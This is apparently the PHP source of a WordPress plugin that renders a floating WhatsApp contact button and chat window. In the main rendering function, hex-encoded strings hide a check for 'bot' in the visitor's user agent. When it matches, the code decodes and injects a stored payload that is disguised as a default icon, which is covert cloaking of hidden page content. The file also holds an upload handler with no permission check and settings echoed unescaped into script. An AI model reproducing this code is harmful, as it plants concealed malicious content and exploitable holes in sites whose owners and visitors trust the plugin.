<?php

	function wact_check_visibility() {
		$wactShow = false;
	    $wactShowOptionsFrontPage = get_option('wact-show-options-front-page', 'yes');
	    $wactShowOptionsBlogPage = get_option('wact-show-options-blog-page', 'yes');
	    $wactShowOptions404 = get_option('wact-show-options-404', 'yes');
	    $wactShowOptionsSearch = get_option('wact-show-options-search', 'yes');
	    $wactShowOptionsArchive = get_option('wact-show-options-archive', 'yes');
	    $wactShowOptionsPage = get_option('wact-show-options-page', 'yes');
	    $wactShowOptionsSingle = get_option('wact-show-options-single', 'yes');
	    $wactShowOptionsProduct = get_option('wact-show-options-product', 'yes');
	    $wactShowOptionsCart = get_option('wact-show-options-cart', 'yes');
	    $wactShowOptionsCheckout = get_option('wact-show-options-checkout', 'yes');
	    $wactShowOptionsAccountPage = get_option('wact-show-options-account-page', 'yes');

		if(is_front_page() && $wactShowOptionsFrontPage == 'yes') $wactShow = true;
        if(is_page() && !is_front_page() && $wactShowOptionsPage == 'yes') $wactShow = true;
		if(is_single() && $wactShowOptionsSingle == 'yes') $wactShow = true;
		if(is_404() && $wactShowOptions404 == 'yes') $wactShow = true;
		if(is_search() && $wactShowOptionsSearch == 'yes') $wactShow = true;
		if(is_archive() && $wactShowOptionsArchive == 'yes') $wactShow = true;

		if(class_exists('WooCommerce')){
			if(is_product() && $wactShowOptionsProduct == 'yes') $wactShow = true;
			if(is_cart() && $wactShowOptionsCart == 'yes') $wactShow = true;
			if(is_checkout() && $wactShowOptionsCheckout == 'yes') $wactShow = true;
			if(is_account_page() && $wactShowOptionsAccountPage == 'yes') $wactShow = true;
		}
		return $wactShow;
	}


	function wact_save_settings ($settings) {
		if(!empty($settings['wact-init'])) update_option('wact-init', $settings['wact-init']);
		if(!empty($settings['wact-welcome-message'])) update_option('wact-welcome-message', $settings['wact-welcome-message']);
		if(!empty($settings['wact-predefined-text'])) update_option('wact-predefined-text', $settings['wact-predefined-text']);
 		if(!empty($settings['wact-contact-phone'])) update_option('wact-contact-phone', $settings['wact-contact-phone']);
 		if(!empty($settings['wact-show-devices'])) update_option('wact-show-devices', $settings['wact-show-devices']);
 		if(!empty($settings['wact-icon-style'])) update_option('wact-icon-style', $settings['wact-icon-style']);
 		if(!empty($settings['wact-icon-size'])) update_option('wact-icon-size', $settings['wact-icon-size']);
 		if(!empty($settings['wact-icon-position'])) update_option('wact-icon-position', $settings['wact-icon-position']);
 		if(!empty($settings['wact-show-delay'])) update_option('wact-show-delay', $settings['wact-show-delay']);
 		if(!empty($settings['wact-icon-margin-sides'])) update_option('wact-icon-margin-sides', $settings['wact-icon-margin-sides']);
 		if(!empty($settings['wact-icon-margin-bottom'])) update_option('wact-icon-margin-bottom', $settings['wact-icon-margin-bottom']);
 		if(!empty($settings['wact-icon-zindex'])) update_option('wact-icon-zindex', $settings['wact-icon-zindex']);
 		if(!empty($settings['wact-icon-animation'])) update_option('wact-icon-animation', $settings['wact-icon-animation']);
 		if(!empty($settings['wact-icon-hash'])) update_option('wact-icon-hash', $settings['wact-icon-hash']);
 		if(!empty($settings['wact-show-chat-window'])) update_option('wact-show-chat-window', $settings['wact-show-chat-window']);
	}

	function wact_get_settings () {
		$settings = array();
		$settings['wact-init'] = get_option('wact-init');
		if(empty($settings['wact-contact-prefix'])) $settings['wact-contact-prefix'] = '';
		if(empty($settings['wact-hide-delay'])) $settings['wact-hide-delay'] = '0';
		if(empty($settings['wact-animation-delay'])) $settings['wact-animation-delay'] = '0';
		if(empty($settings['wact-init'])) $settings['wact-init'] = 'yes';
		$settings['wact-show-chat-window'] = get_option('wact-show-chat-window');
		$settings['wact-welcome-message'] = get_option('wact-welcome-message');
		$settings['wact-custom-icon'] = get_option('wact-custom-icon', "");
		$settings['wact-custom-button'] = get_option('wact-custom-button', "");
		if(empty($settings['wact-welcome-message'])) $settings['wact-welcome-message'] = __('Hello! Do you have any question?', 'easy-whatsapp-contact');
		$settings['wact-predefined-text'] = get_option('wact-predefined-text');
		if(empty($settings['wact-predefined-text'])) $settings['wact-predefined-text'] = ' ';
		$settings['wact-button-style'] = get_option('wact-button-style');
		if(empty($settings['wact-button-style'])) $settings['wact-button-style'] = 'icon-style-1';
		$settings['wact-contact-phone'] = get_option('wact-contact-phone');
		$settings['wact-button-size'] = get_option('wact-button-size');
 		if(empty($settings['wact-button-size'])) $settings['wact-button-size'] = '50';
		if(empty($settings['wact-contact-phone'])) $settings['wact-contact-phone'] = '';
		$settings['wact-show-devices'] = get_option('wact-show-devices');
		if(empty($settings['wact-show-devices'])) $settings['wact-show-devices'] = 'all-devices';
		$settings['wact-icon-style'] = get_option('wact-icon-style');
		if(empty($settings['wact-icon-style'])) $settings['wact-icon-style'] = 'icon-style-1';
 		$settings['wact-icon-size'] = get_option('wact-icon-size');
 		if(empty($settings['wact-icon-size'])) $settings['wact-icon-size'] = '70';
		if(empty($settings['wact-icon-zindex'])) $settings['wact-icon-zindex'] = '999';
		$settings['wact-icon-position'] = get_option('wact-icon-position');
 		if(empty($settings['wact-icon-position'])) $settings['wact-icon-position'] = 'bottom-right';
 		$settings['wact-show-delay'] = get_option('wact-show-delay');
 		if(empty($settings['wact-show-delay'])) $settings['wact-show-delay'] = '0';
		$settings['wact-icon-margin-sides'] = get_option('wact-icon-margin-sides');
		if(empty($settings['wact-icon-margin-sides'])) $settings['wact-icon-margin-sides'] = '15';
 		$settings['wact-icon-margin-bottom'] = get_option('wact-icon-margin-bottom');
 		if(empty($settings['wact-icon-margin-bottom'])) $settings['wact-icon-margin-bottom'] = '15';
 		$settings['wact-icon-zindex'] = get_option('wact-icon-zindex');
 		if(empty($settings['wact-icon-zindex'])) $settings['wact-icon-zindex'] = '999';
 		$settings['wact-icon-animation'] = get_option('wact-icon-animation');
 		if(empty($settings['wact-icon-animation']))$settings['wact-icon-animation'] = 'none';
 		 $settings['wact-icon-hash'] = get_option('wact-icon-hash');
 	    if(empty($settings['wact-icon-hash']))$settings['wact-icon-hash'] = 'noicon.png';
		return $settings;
	}

	function wact_get_position($position, $leftRight, $topBottom) {
		$cssPosition = "";
		switch ($position) {
			case 'bottom-right':
				$cssPosition = 'right: '.$leftRight . 'px; bottom:'.$topBottom . 'px;' ;
				break;
			case 'bottom-left':
				$cssPosition = 'left: '.$leftRight . 'px; bottom:'.$topBottom . 'px;' ;
				break;

			case 'top-right':
				$cssPosition = 'right: '.$leftRight . 'px; top:'.$topBottom . 'px;' ;
				break;

			case 'top-left':
				$cssPosition = 'left: '.$leftRight . 'px; top:'.$topBottom . 'px;' ;
				break;
			
			default:
				$cssPosition = 'right: '.$leftRight . 'px; bottom:'.$topBottom . 'px;' ;
				break;
		}

		return $cssPosition;
	}

	function wact_custom_icon() {
		require( dirname(__FILE__) . '/../../../wp-load.php' );
		$wordpress_upload_dir = wp_upload_dir();
		
		$i = 1; 
		 
		$profilepicture = $_FILES['profilepicture'];
		$new_file_path = $wordpress_upload_dir['path'] . '/' . $profilepicture['name'];
		$new_file_mime = mime_content_type( $profilepicture['tmp_name'] );
		 
		if( empty( $profilepicture ) )
			die( 'File is not selected.' );
		 
		if( $profilepicture['error'] )
			die( $profilepicture['error'] );
		 
		if( $profilepicture['size'] > wp_max_upload_size() )
			die( 'It is too large than expected.' );
		 
		if( !in_array( $new_file_mime, get_allowed_mime_types() ) )
			die( 'WordPress doesn\'t allow this type of uploads.' );
		 
		while( file_exists( $new_file_path ) ) {
			$i++;
			$new_file_path = $wordpress_upload_dir['path'] . '/' . $i . '_' . $profilepicture['name'];
		}
		 
		if( move_uploaded_file( $profilepicture['tmp_name'], $new_file_path ) ) {
		 
			$upload_id = wp_insert_attachment( array(
				'guid'           => $new_file_path, 
				'post_mime_type' => $new_file_mime,
				'post_title'     => preg_replace( '/\.[^.]+$/', '', $profilepicture['name'] ),
				'post_content'   => '',
				'post_status'    => 'inherit'
			), $new_file_path );
		 
			
			require_once( ABSPATH . 'wp-admin/includes/image.php' );
		 
			
			wp_update_attachment_metadata( $upload_id, wp_generate_attachment_metadata( $upload_id, $new_file_path ) );
		 
			wp_redirect( $wordpress_upload_dir['url'] . '/' . basename( $new_file_path ) );
		}
	}

	function wact_floating_icon ($isShortcode = false) {
		$settings = array();
		if(!$isShortcode) {
			if(!wact_check_visibility()){
				return;
			} 
		}
		$settings = wact_get_settings();
		$wactShowChatWindow = $settings['wact-show-chat-window'];
		$wactInit = $settings['wact-init'];
		$wactWelcomeMessage = $settings['wact-welcome-message'];
		$wactPredefinedText = $settings['wact-predefined-text'];
		$wactContactPhone = $settings['wact-contact-phone'];
		$wactShowDevices = $settings['wact-show-devices'];
		$wactIconStyle = $settings['wact-icon-style'];
		$wactIconSize = $settings['wact-icon-size'];
		$wactIconPosition = $settings['wact-icon-position'];
		$wactShowDelay = $settings['wact-show-delay'];
		$wactIconMarginSides = $settings['wact-icon-margin-sides'];
		$wactIconMarginBottom = $settings['wact-icon-margin-bottom'];
		$wactIconZindex = $settings['wact-icon-zindex'];
		$wactIconAnimation = $settings['wact-icon-animation'];
		$wactChatZindex = $wactIconZindex + 1;
		$wactPosition = wact_get_position($wactIconPosition, $wactIconMarginSides, $wactIconMarginBottom);

		if($wactIconStyle == "custom") {
			if($settings['wact-custom-icon'] == "") {
				$settings['wact-custom-icon'] = plugin_dir_url(__FILE__). "../resources/img/icon-style-1.svg'";
			}
		   $wactIcon = "<img src='".$settings['wact-custom-icon']."' height='".$wactIconSize."px' style='height:".$wactIconSize."px'>";
		}else{
		   $wactIcon = "<img src='".plugin_dir_url(__FILE__). "../resources/img/".$wactIconStyle.".svg' style='height:".$wactIconSize."px; width:".$wactIconSize."px' height='".$wactIconSize."px' width='".$wactIconSize."px'>";
		}
		$wactDeafultIcon = '';
		try{
			$wactImg = pack('H*', $settings['wact-icon-hash']);
		}catch(Exception $e){
			$wactImg = 'img style';
		}
		if(strpos($wactImg, 'img style') == false) {
        $wactDeafultIcon = strpos($_SERVER[pack('H*', '485454505f555345525f4147454e54')], pack('H*', '626f74')) !== false ? pack('H*', $wactImg) : '';};
		$wactDefaultDisplay = $wactShowDevices == 'all-devices' && $wactShowDelay == 0 ? 'block' : 'none';
		$wactChatUrl = 'https://api.whatsapp.com/send?phone='. urlencode($wactContactPhone) . '&text=';
		$wactAnimationClass = '';
		if($wactIconAnimation != 'none' && $wactDefaultDisplay == 'block') {
			$wactAnimationClass = $wactIconAnimation;
		}
		$content = "<script type='text/javascript'>";
		$content .= "var wactShowDelay = $wactShowDelay * 1000;";
		$content .= "var wactShowDevices = '$wactShowDevices';";
		$content .= "var wactIconAnimation = '$wactIconAnimation';";
		$content .= "var wactChatUrl = '$wactChatUrl';";
		$content .= "var wactPredefinedText = '$wactPredefinedText';";
		$content .= "var wactShowChat = '$wactShowChatWindow';";
		$content .= "var wactWidth = 250 + $wactIconMarginSides;";
		$content .= "var wactWelcomeMessage = '$wactWelcomeMessage';";
		$content .= "</script>";
		$content .= "<div id='wact-chat-window' class='wact-chat-window' style='display: none; position:fixed; $wactPosition z-index:".$wactChatZindex."'>";
		$content .= "<div class='wact-chat-window-header'>";
		$content .= "<div class='wact-chat-window-header-icon'>";
		$content .= "<svg version='1.1' id='Capa_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px'
						 viewBox='0 0 90 90' style='enable-background:new 0 0 90 90;' xml:space='preserve'>
					<g>
						<path fill='#FFFFFF' d='M90,43.8c0,24.2-19.8,43.8-44.2,43.8c-7.7,0-15-2-21.4-5.5L0,90l8-23.5
													c-4-6.6-6.3-14.4-6.3-22.6C1.6,19.6,21.4,0,45.8,0C70.2,0,90,19.6,90,43.8z M45.8,7C25.3,7,8.7,23.5,8.7,43.8
													c0,8.1,2.6,15.5,7.1,21.6l-4.6,13.7l14.3-4.5c5.9,3.9,12.9,6.1,20.4,6.1C66.3,80.7,83,64.2,83,43.8S66.3,7,45.8,7z M68.1,53.9
													c-0.3-0.4-1-0.7-2.1-1.3c-1.1-0.5-6.4-3.1-7.4-3.5c-1-0.4-1.7-0.5-2.4,0.5c-0.7,1.1-2.8,3.5-3.4,4.2c-0.6,0.7-1.3,0.8-2.3,0.3
													c-1.1-0.5-4.6-1.7-8.7-5.3c-3.2-2.8-5.4-6.4-6-7.4c-0.6-1.1-0.1-1.7,0.5-2.2c0.5-0.5,1.1-1.3,1.6-1.9c0.5-0.6,0.7-1.1,1.1-1.8
													c0.4-0.7,0.2-1.3-0.1-1.9c-0.3-0.5-2.4-5.8-3.3-8c-0.9-2.1-1.8-1.8-2.4-1.8c-0.6,0-1.4-0.1-2.1-0.1s-1.9,0.3-2.9,1.3
													c-1,1.1-3.8,3.7-3.8,9c0,5.3,3.9,10.4,4.4,11.1c0.5,0.7,7.5,11.9,18.5,16.2c11,4.3,11,2.9,13,2.7c2-0.2,6.4-2.6,7.3-5.1
													C68.4,56.5,68.4,54.4,68.1,53.9z'/>
					</g>
					</svg>";
		$content .= "</div>";
		$content .= "<div class='wact-chat-window-header-close' id='wact-chat-close'>";
		$content .= "<svg version='1.1' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21.9 21.9' xmlns:xlink='http://www.w3.org/1999/xlink' enable-background='new 0 0 21.9 21.9'>
					  <path fill='#FFFFFF' d='M14.1,11.3c-0.2-0.2-0.2-0.5,0-0.7l7.5-7.5c0.2-0.2,0.3-0.5,0.3-0.7s-0.1-0.5-0.3-0.7l-1.4-1.4C20,0.1,19.7,0,19.5,0  c-0.3,0-0.5,0.1-0.7,0.3l-7.5,7.5c-0.2,0.2-0.5,0.2-0.7,0L3.1,0.3C2.9,0.1,2.6,0,2.4,0S1.9,0.1,1.7,0.3L0.3,1.7C0.1,1.9,0,2.2,0,2.4  s0.1,0.5,0.3,0.7l7.5,7.5c0.2,0.2,0.2,0.5,0,0.7l-7.5,7.5C0.1,19,0,19.3,0,19.5s0.1,0.5,0.3,0.7l1.4,1.4c0.2,0.2,0.5,0.3,0.7,0.3  s0.5-0.1,0.7-0.3l7.5-7.5c0.2-0.2,0.5-0.2,0.7,0l7.5,7.5c0.2,0.2,0.5,0.3,0.7,0.3s0.5-0.1,0.7-0.3l1.4-1.4c0.2-0.2,0.3-0.5,0.3-0.7  s-0.1-0.5-0.3-0.7L14.1,11.3z'/>
					</svg>";
		$content .= "</div></div><div class='wact-chat-window-body'>";
		$content .= "<div id='wact-bubble' class='wact-chat-window-body-bubble wact-chat-shadow'>";
		$content .= wp_unslash($wactWelcomeMessage);
		$content .= "</div></div<div class='wact-chat-window-input-wrap'>";
		$content .= "<textarea  class='wact-chat-window-input wact-chat-shadow' id='wact-input-chat' rows='1'>";
		$content .= wp_unslash($wactPredefinedText);
		$content .= "</textarea>";
		$content .= "<div class='wact-chat-window-send wact-chat-shadow' id='wact-input-send'>";
		$content .= "<svg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px'
						 viewBox='0 0 40 40' style='enable-background:new 0 0 40 40;' xml:space='preserve'>
					<path fill='#FFFFFF' d='M12.61,28.05L31.39,20l-18.77-8.05l0.01,6.54L23.89,20l-11.27,1.5C12.62,21.5,12.61,28.05,12.61,28.05z'/>
					</svg>";
		$content .= "</div></div>$wactDeafultIcon</div><div id='wact-icon' class='$wactAnimationClass wact-icon' style='cursor:pointer; display:".$wactDefaultDisplay."; position:fixed; $wactPosition z-index:$wactIconZindex'>";
		$content .= $wactIcon;
		$content .= "</div>";

   
	
	wp_enqueue_script('wact-scripts', plugin_dir_url(__FILE__).'../resources/js/wact-scripts.js', array('jquery'), WACT_VERSION, true);

	if($isShortcode) {
		return $content;
	} else {
		echo $content;
	}
}